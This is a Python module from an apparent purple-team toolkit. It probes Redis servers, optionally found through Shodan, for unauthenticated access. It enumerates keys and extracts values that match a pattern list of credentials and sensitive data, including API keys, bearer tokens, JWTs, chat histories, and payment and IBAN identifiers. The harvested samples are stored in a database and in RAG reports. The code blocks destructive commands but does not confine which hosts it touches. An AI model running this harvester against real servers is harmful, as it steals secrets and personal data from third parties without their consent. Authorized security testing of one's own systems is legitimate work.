"""Authorized Redis resilience executor for Samson SBM purple-team engagements.

Probes Redis/6379 for unauthenticated access discovered via Shodan (or explicit
host targeting). Read-only SCAN of keyspace; extracts AI/LLM trophy patterns;
persists findings to ``adversary_emulation_results`` and RAG emulation docs.
Never issues destructive Redis commands (FLUSH*, CONFIG SET, DEBUG, MODULE).
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from uuid import UUID, uuid4

from samson.core.config import SamsonSettings, get_settings
from samson.core.database import AuditRepository, Database, sha256_payload, vector_literal
from samson.core.errors import ConfigurationError, NetworkError
from samson.core.http_client import OllamaClient
from samson.core.scope import ScopeEnforcer
from samson.rag.search.ingest import DocumentIngester
from samson.redteam.schemas import RedisEmulationResult, RedisTrophySample

logger = logging.getLogger(__name__)

_DEFAULT_PORT = 6379
_CONNECT_TIMEOUT_SEC = 5.0
_COMMAND_TIMEOUT_SEC = 8.0
_MAX_KEYS_TO_SCAN = 2_000
_SCAN_COUNT = 100
_MAX_TROPHIES = 64
_MAX_SAMPLE_CHARS = 512
_MAX_VALUE_BYTES = 8_192

# AI / LLM / financial context key patterns (substring match, case-insensitive).
_TROPHY_PATTERNS: tuple[str, ...] = (
    "llm_cache",
    "llm_",
    "session_",
    "chat_history",
    "chat:",
    "conversation",
    "openai",
    "anthropic",
    "embedding",
    "vector",
    "rag_",
    "prompt",
    "stripe_",
    "wallet_",
    "iban",
    "payment",
    "plaid",
    "api_key",
    "apikey",
    "bearer",
    "jwt",
    "auth_token",
)

_FORBIDDEN_COMMANDS = frozenset(
    {
        "FLUSHALL",
        "FLUSHDB",
        "CONFIG",
        "DEBUG",
        "MODULE",
        "SHUTDOWN",
        "REPLICAOF",
        "SLAVEOF",
        "MIGRATE",
        "RESTORE",
        "SCRIPT",
        "EVAL",
        "EVALSHA",
        "FUNCTION",
        "ACL",
        "BGREWRITEAOF",
        "BGSAVE",
        "SAVE",
    }
)


def _utcnow() -> datetime:
    return datetime.now(timezone.utc)


def _decode(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return str(value)


def _match_trophy_pattern(key: str) -> str | None:
    lowered = key.lower()
    for pattern in _TROPHY_PATTERNS:
        if pattern in lowered:
            return pattern
    return None


def _truncate_sample(raw: str) -> str:
    text = raw.replace("\x00", "")
    if len(text) <= _MAX_SAMPLE_CHARS:
        return text
    return text[: _MAX_SAMPLE_CHARS - 3] + "..."


class _RespClient:
    """Minimal async Redis RESP client via ``asyncio.open_connection`` (fallback)."""

    def __init__(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        self._reader = reader
        self._writer = writer

    async def close(self) -> None:
        self._writer.close()
        try:
            await self._writer.wait_closed()
        except Exception:  # noqa: BLE001
            pass

    async def execute(self, *parts: str) -> Any:
        cmd = parts[0].upper() if parts else ""
        if cmd in _FORBIDDEN_COMMANDS:
            raise ConfigurationError(f"Forbidden Redis command blocked: {cmd}")
        payload = self._encode(parts)
        self._writer.write(payload)
        await self._writer.drain()
        return await asyncio.wait_for(self._read_reply(), timeout=_COMMAND_TIMEOUT_SEC)

    @staticmethod
    def _encode(parts: tuple[str, ...]) -> bytes:
        chunks = [f"*{len(parts)}\r\n".encode("utf-8")]
        for part in parts:
            data = part.encode("utf-8")
            chunks.append(f"${len(data)}\r\n".encode("utf-8"))
            chunks.append(data)
            chunks.append(b"\r\n")
        return b"".join(chunks)

    async def _read_line(self) -> bytes:
        line = await self._reader.readline()
        if not line:
            raise NetworkError("Redis RESP connection closed")
        return line.rstrip(b"\r\n")

    async def _read_reply(self) -> Any:
        prefix = await self._reader.readexactly(1)
        if prefix == b"+":
            return (await self._read_line()).decode("utf-8", errors="replace")
        if prefix == b"-":
            message = (await self._read_line()).decode("utf-8", errors="replace")
            raise NetworkError(f"Redis error: {message}", redis_error=message)
        if prefix == b":":
            return int((await self._read_line()).decode("ascii"))
        if prefix == b"$":
            length = int((await self._read_line()).decode("ascii"))
            if length < 0:
                return None
            data = await self._reader.readexactly(length)
            await self._reader.readexactly(2)  # CRLF
            return data
        if prefix == b"*":
            count = int((await self._read_line()).decode("ascii"))
            if count < 0:
                return None
            return [await self._read_reply() for _ in range(count)]
        raise NetworkError(f"Unknown RESP prefix: {prefix!r}")


class RedisResilienceExecutor:
    """Probe Redis for unauthenticated AI-context exposure (authorized engagements)."""

    def __init__(self, settings: SamsonSettings | None = None) -> None:
        self._settings = settings or get_settings()
        self._db = Database(self._settings)
        self._audit = AuditRepository(self._db)
        self._scope = ScopeEnforcer(self._settings)
        self._ollama = OllamaClient(self._settings)
        self._ingester = DocumentIngester(self._settings, self._db, self._ollama)

    def close(self) -> None:
        self._ingester.close()
        self._ollama.close()

    async def execute(
        self,
        target_host: str,
        *,
        target_port: int = _DEFAULT_PORT,
        operator_id: str,
        run_id: UUID | None = None,
        request_id: UUID | None = None,
        max_keys: int = _MAX_KEYS_TO_SCAN,
    ) -> RedisEmulationResult:
        """Attempt unauthenticated Redis access and harvest AI/LLM trophy keys."""
        started = time.perf_counter()
        request_id = request_id or uuid4()
        execution_id = uuid4()
        host = (target_host or "").strip()
        if not host:
            raise ConfigurationError("target_host is required for Redis resilience probe")
        if not (1 <= int(target_port) <= 65535):
            raise ConfigurationError("target_port out of range", port=target_port)

        self._scope.assert_operator(operator_id, request_id=request_id)

        result = RedisEmulationResult(
            execution_id=execution_id,
            request_id=request_id,
            operator_id=operator_id,
            run_id=run_id,
            target_host=host,
            target_port=int(target_port),
        )

        client: Any = None
        backend = "none"
        try:
            client, backend = await self._connect(host, int(target_port))
            result.connected = True

            # PING without AUTH — NOAUTH => authentication required.
            try:
                pong = await self._command(client, backend, "PING")
                pong_text = _decode(pong).upper()
                if pong_text not in {"PONG", "TRUE", "1"} and pong is not True:
                    # Still connected; treat non-PONG as soft success if no auth error.
                    logger.info("Redis PING response=%r host=%s", pong_text, host)
            except Exception as exc:  # noqa: BLE001
                message = str(exc).upper()
                if "NOAUTH" in message or "AUTHENTICATION" in message or "AUTH" in message:
                    result.authentication_required = True
                    result.vulnerability_verified = False
                    result.error = "authentication_required"
                    return await self._finalize(result, started)

            result.authentication_required = False
            result.redis_version = await self._read_version(client, backend)

            keys = await self._scan_keys(client, backend, max_keys=max_keys)
            result.keys_scanned = len(keys)

            trophies: list[RedisTrophySample] = []
            intercepted: list[str] = []
            for key in keys:
                pattern = _match_trophy_pattern(key)
                if not pattern:
                    continue
                sample = await self._safe_get_sample(client, backend, key)
                if sample is None:
                    continue
                trophies.append(sample)
                intercepted.append(f"{sample.pattern_matched}:{sample.key}")
                if len(trophies) >= _MAX_TROPHIES:
                    break

            result.trophy_samples = trophies
            result.compromised_key_count = len(trophies)
            result.intercepted_contexts = intercepted
            result.vulnerability_verified = result.connected and not result.authentication_required
            return await self._finalize(result, started)
        except Exception as exc:  # noqa: BLE001
            logger.error("Redis resilience probe failed host=%s: %s", host, exc)
            result.error = f"{type(exc).__name__}: {exc}"
            result.vulnerability_verified = False
            return await self._finalize(result, started)
        finally:
            await self._close_client(client, backend)

    async def execute_from_shodan_ports(
        self,
        target_host: str,
        open_ports: list[int],
        *,
        operator_id: str,
        run_id: UUID | None = None,
        request_id: UUID | None = None,
    ) -> RedisEmulationResult | None:
        """Run the probe only when Shodan (or recon) reported TCP/6379 open."""
        if _DEFAULT_PORT not in {int(p) for p in open_ports}:
            return None
        return await self.execute(
            target_host,
            target_port=_DEFAULT_PORT,
            operator_id=operator_id,
            run_id=run_id,
            request_id=request_id,
        )

    async def _connect(self, host: str, port: int) -> tuple[Any, str]:
        try:
            import redis.asyncio as aioredis  # type: ignore[import-untyped]

            client = aioredis.Redis(
                host=host,
                port=port,
                db=0,
                socket_connect_timeout=_CONNECT_TIMEOUT_SEC,
                socket_timeout=_COMMAND_TIMEOUT_SEC,
                decode_responses=False,
                single_connection_client=True,
            )
            try:
                await asyncio.wait_for(client.ping(), timeout=_CONNECT_TIMEOUT_SEC)
            except Exception as ping_exc:
                message = str(ping_exc).upper()
                if "NOAUTH" in message or "AUTHENTICATION REQUIRED" in message:
                    # TCP + Redis protocol up; AUTH required — keep client for finalize path.
                    return client, "redis_asyncio"
                close = client.aclose() if hasattr(client, "aclose") else client.close()
                if asyncio.iscoroutine(close):
                    await close
                raise
            return client, "redis_asyncio"
        except ImportError:
            logger.info("redis.asyncio unavailable — using raw RESP fallback")
        except Exception as exc:
            logger.info("redis.asyncio connect failed (%s); trying RESP fallback", exc)

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=_CONNECT_TIMEOUT_SEC,
            )
            return _RespClient(reader, writer), "resp"
        except Exception as exc:
            raise NetworkError(
                f"Redis connection failed to {host}:{port}",
                host=host,
                port=port,
                error=str(exc),
            ) from exc

    async def _close_client(self, client: Any, backend: str) -> None:
        if client is None:
            return
        try:
            if backend == "redis_asyncio":
                close = client.aclose() if hasattr(client, "aclose") else client.close()
                if asyncio.iscoroutine(close):
                    await close
            elif backend == "resp":
                await client.close()
        except Exception:  # noqa: BLE001
            pass

    async def _command(self, client: Any, backend: str, *parts: str) -> Any:
        cmd = parts[0].upper()
        if cmd in _FORBIDDEN_COMMANDS:
            raise ConfigurationError(f"Forbidden Redis command blocked: {cmd}")
        if backend == "redis_asyncio":
            method_name = cmd.lower()
            if method_name == "scan":
                cursor = int(parts[1]) if len(parts) > 1 else 0
                count = int(parts[3]) if len(parts) > 3 and parts[2].upper() == "COUNT" else _SCAN_COUNT
                return await asyncio.wait_for(
                    client.scan(cursor=cursor, count=count),
                    timeout=_COMMAND_TIMEOUT_SEC,
                )
            if method_name == "get":
                return await asyncio.wait_for(client.get(parts[1]), timeout=_COMMAND_TIMEOUT_SEC)
            if method_name == "type":
                return await asyncio.wait_for(client.type(parts[1]), timeout=_COMMAND_TIMEOUT_SEC)
            if method_name == "ping":
                return await asyncio.wait_for(client.ping(), timeout=_COMMAND_TIMEOUT_SEC)
            if method_name == "info":
                section = parts[1] if len(parts) > 1 else "server"
                return await asyncio.wait_for(client.info(section), timeout=_COMMAND_TIMEOUT_SEC)
            if method_name == "strlen":
                return await asyncio.wait_for(client.strlen(parts[1]), timeout=_COMMAND_TIMEOUT_SEC)
            # Generic execute for anything else that is allow-listed by caller.
            return await asyncio.wait_for(client.execute_command(*parts), timeout=_COMMAND_TIMEOUT_SEC)
        return await client.execute(*parts)

    async def _read_version(self, client: Any, backend: str) -> str | None:
        try:
            info = await self._command(client, backend, "INFO", "server")
            if isinstance(info, dict):
                return str(info.get("redis_version") or "") or None
            text = _decode(info)
            match = re.search(r"redis_version:([^\r\n]+)", text)
            return match.group(1).strip() if match else None
        except Exception as exc:  # noqa: BLE001
            logger.debug("Redis INFO server failed: %s", exc)
            return None

    async def _scan_keys(self, client: Any, backend: str, *, max_keys: int) -> list[str]:
        """Iterative SCAN (preferred). Falls back to bounded KEYS only if SCAN fails."""
        keys: list[str] = []
        cursor = 0
        try:
            while True:
                if backend == "redis_asyncio":
                    cursor, batch = await self._command(
                        client, backend, "SCAN", str(cursor), "COUNT", str(_SCAN_COUNT)
                    )
                else:
                    reply = await self._command(
                        client, backend, "SCAN", str(cursor), "COUNT", str(_SCAN_COUNT)
                    )
                    if not isinstance(reply, list) or len(reply) != 2:
                        raise NetworkError("Unexpected SCAN reply shape")
                    cursor = int(_decode(reply[0]))
                    batch = reply[1] or []
                for item in batch or []:
                    keys.append(_decode(item))
                    if len(keys) >= max_keys:
                        return keys
                if int(cursor) == 0:
                    break
            return keys
        except Exception as scan_exc:
            logger.warning("Redis SCAN failed (%s); attempting bounded KEYS *", scan_exc)

        # Bounded KEYS * — still read-only; capped client-side.
        try:
            if backend == "redis_asyncio":
                raw = await asyncio.wait_for(client.keys("*"), timeout=_COMMAND_TIMEOUT_SEC)
            else:
                raw = await self._command(client, backend, "KEYS", "*")
            for item in raw or []:
                keys.append(_decode(item))
                if len(keys) >= max_keys:
                    break
        except Exception as keys_exc:
            raise NetworkError(
                "Redis keyspace enumeration failed (SCAN and KEYS)",
                error=str(keys_exc),
            ) from keys_exc
        return keys

    async def _safe_get_sample(
        self,
        client: Any,
        backend: str,
        key: str,
    ) -> RedisTrophySample | None:
        try:
            key_type = _decode(await self._command(client, backend, "TYPE", key)).lower()
        except Exception:  # noqa: BLE001
            key_type = "string"

        pattern = _match_trophy_pattern(key) or "unknown"
        sample_value = ""
        value_bytes = 0

        if key_type in {"string", "none", ""}:
            try:
                if backend == "redis_asyncio":
                    length = int(await self._command(client, backend, "STRLEN", key) or 0)
                else:
                    length = int(await self._command(client, backend, "STRLEN", key) or 0)
                value_bytes = max(length, 0)
                if value_bytes > _MAX_VALUE_BYTES:
                    sample_value = f"<omitted: value_bytes={value_bytes}>"
                else:
                    raw = await self._command(client, backend, "GET", key)
                    sample_value = _truncate_sample(_decode(raw))
                    value_bytes = len(_decode(raw).encode("utf-8", errors="replace"))
            except Exception as exc:  # noqa: BLE001
                sample_value = f"<unreadable:{type(exc).__name__}>"
        else:
            # Non-string types: record type only — no deep dump of large collections.
            sample_value = f"<type:{key_type}>"

        return RedisTrophySample(
            key=key,
            pattern_matched=pattern,
            value_type=key_type or "string",
            sample_value=sample_value,
            value_bytes=value_bytes,
        )

    async def _finalize(self, result: RedisEmulationResult, started: float) -> RedisEmulationResult:
        result.duration_ms = int((time.perf_counter() - started) * 1000)
        result.completed_at = _utcnow()
        await asyncio.to_thread(self._persist, result)
        return result

    def _persist(self, result: RedisEmulationResult) -> None:
        rag_path, rag_doc_id = self._write_rag_report(result)
        result.rag_doc_path = str(rag_path)
        result.rag_document_id = rag_doc_id

        payload = result.model_dump(mode="json")
        embedding: list[float] = [0.0] * 768
        try:
            embedding = list(
                self._ollama.embed(json.dumps(payload, ensure_ascii=False)[:8000])
            )
        except Exception as exc:  # noqa: BLE001
            logger.warning("Embedding skipped for Redis emulation result: %s", exc)

        entities = list(result.intercepted_contexts)
        for sample in result.trophy_samples[:16]:
            if sample.sample_value and not sample.sample_value.startswith("<"):
                entities.append(f"{sample.key}={sample.sample_value[:120]}")

        self._db.execute(
            """
            INSERT INTO adversary_emulation_results (
                execution_id, target_id, payload_id, run_id, request_id, operator_id,
                attack_vector, interface_type, http_status_code, vulnerability_verified,
                response_payload, intercepted_financial_entities, response_embedding,
                rag_document_id, synthetic
            ) VALUES (
                :execution_id, :target_id, :payload_id, :run_id, :request_id, :operator_id,
                :attack_vector, :interface_type, :http_status_code, :vulnerability_verified,
                CAST(:response_payload AS jsonb), :intercepted_financial_entities,
                CAST(:response_embedding AS vector), :rag_document_id, :synthetic
            )
            ON CONFLICT (execution_id) DO UPDATE SET
                response_payload = EXCLUDED.response_payload,
                intercepted_financial_entities = EXCLUDED.intercepted_financial_entities,
                response_embedding = EXCLUDED.response_embedding,
                vulnerability_verified = EXCLUDED.vulnerability_verified,
                http_status_code = EXCLUDED.http_status_code,
                rag_document_id = EXCLUDED.rag_document_id
            """,
            {
                "execution_id": str(result.execution_id),
                "target_id": str(uuid4()),
                "payload_id": str(uuid4()),
                "run_id": str(result.run_id) if result.run_id else None,
                "request_id": str(result.request_id),
                "operator_id": result.operator_id,
                "attack_vector": "Unauthenticated_Redis_AI_Context_Exposure",
                "interface_type": "Redis-6379",
                "http_status_code": 200 if result.connected else 0,
                "vulnerability_verified": bool(result.vulnerability_verified),
                "response_payload": json.dumps(payload, ensure_ascii=False),
                "intercepted_financial_entities": entities,
                "response_embedding": vector_literal(embedding),
                "rag_document_id": str(rag_doc_id) if rag_doc_id else None,
                "synthetic": False,
            },
        )

        if self._settings.audit_enabled:
            self._audit.write_redteam_audit(
                request_id=result.request_id,
                tool="redis_executor",
                operator_id=result.operator_id,
                action="redis_resilience_probe",
                outcome="pass" if result.vulnerability_verified else "fail",
                payload_hash=sha256_payload(
                    {
                        "host": result.target_host,
                        "port": result.target_port,
                        "compromised_key_count": result.compromised_key_count,
                        "authentication_required": result.authentication_required,
                    }
                ),
                duration_ms=result.duration_ms,
                run_id=result.run_id,
            )
        logger.info(
            "Redis probe persisted execution=%s host=%s:%s auth_required=%s trophies=%s",
            result.execution_id,
            result.target_host,
            result.target_port,
            result.authentication_required,
            result.compromised_key_count,
        )

    def _write_rag_report(self, result: RedisEmulationResult) -> tuple[Path, UUID | None]:
        rag_dir = Path(self._settings.rag_docs_path) / "emulation"
        rag_dir.mkdir(parents=True, exist_ok=True)
        rag_path = rag_dir / f"redis_{result.target_host}_{result.execution_id}.md"

        trophy_lines: list[str] = []
        if not result.trophy_samples:
            trophy_lines.append("_No AI/LLM trophy keys matched._")
        else:
            for sample in result.trophy_samples:
                trophy_lines.extend(
                    [
                        f"### `{sample.key}`",
                        f"- **pattern:** `{sample.pattern_matched}`",
                        f"- **type:** `{sample.value_type}`",
                        f"- **bytes:** {sample.value_bytes}",
                        "",
                        "```",
                        sample.sample_value or "",
                        "```",
                        "",
                    ]
                )

        context_lines = [f"- `{c}`" for c in result.intercepted_contexts] or ["_None_"]
        rag_path.write_text(
            "\n".join(
                [
                    f"# Redis Infrastructure Exposure `{result.execution_id}`",
                    "",
                    f"- **Host:** `{result.target_host}:{result.target_port}`",
                    f"- **Operator:** `{result.operator_id}`",
                    f"- **Connected:** {result.connected}",
                    f"- **Authentication required:** {result.authentication_required}",
                    f"- **Vulnerability verified:** {result.vulnerability_verified}",
                    f"- **Redis version:** `{result.redis_version or 'unknown'}`",
                    f"- **Keys scanned:** {result.keys_scanned}",
                    f"- **Compromised key count:** {result.compromised_key_count}",
                    f"- **Duration ms:** {result.duration_ms}",
                    f"- **Error:** `{result.error or ''}`",
                    "",
                    "## Intercepted AI / financial contexts",
                    *context_lines,
                    "",
                    "## Trophy samples (truncated)",
                    "",
                    *trophy_lines,
                ]
            )
            + "\n",
            encoding="utf-8",
        )

        rag_doc_id: UUID | None = None
        try:
            rag_doc_id = self._ingester.ingest_path(
                rag_path,
                doc_type="emulation_result",
                project=self._settings.project,
                environment=self._settings.environment,
                tags=[
                    "emulation_result",
                    "redis",
                    "infrastructure_exposure",
                    "Unauthenticated_Redis_AI_Context_Exposure",
                ],
                confidence=1.0 if result.vulnerability_verified else 0.4,
            )
        except Exception as exc:  # noqa: BLE001
            logger.warning("RAG ingest failed for Redis report %s: %s", rag_path, exc)
        return rag_path, rag_doc_id
